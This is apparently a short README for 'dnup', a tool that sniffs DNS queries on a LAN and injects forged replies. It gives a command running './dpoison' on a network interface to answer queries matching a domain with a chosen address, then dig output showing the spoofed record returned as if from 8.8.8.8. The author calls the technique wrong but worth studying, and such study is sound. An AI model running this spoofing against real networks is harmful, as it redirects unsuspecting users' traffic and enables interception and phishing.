dnup
====

DNS poison for L2
Sniffing + injection

If domain name queries would be being sent over broadcast in LAN,
one can read those queries and inject own replies.
Let's do this

http://dnscurve.org/espionage.html

And although this is wrong, it is still may be interesting to study.

$ sudo ./dpoison --device enp0s20u2u3 udp and dst port 53 --query ".*\.reverbrain\.com" --A "1.1.1.1"
...

$ dig @8.8.8.8 www.reverbrain.com
;; Warning: query response not set

; <<>> DiG 9.9.3-rl.13207.22-P2-RedHat-9.9.3-5.P2.fc19 <<>> @8.8.8.8 www.reverbrain.com
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 22647
;; flags: rd ad; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
;; WARNING: recursion requested but not available

;; QUESTION SECTION:
;www.reverbrain.com.		IN	A

;; ANSWER SECTION:
www.reverbrain.com.	100	IN	A	1.1.1.1

;; Query time: 1 msec
;; SERVER: 8.8.8.8#53(8.8.8.8)
;; WHEN: Thu Nov 14 22:34:39 MSK 2013
;; MSG SIZE  rcvd: 70

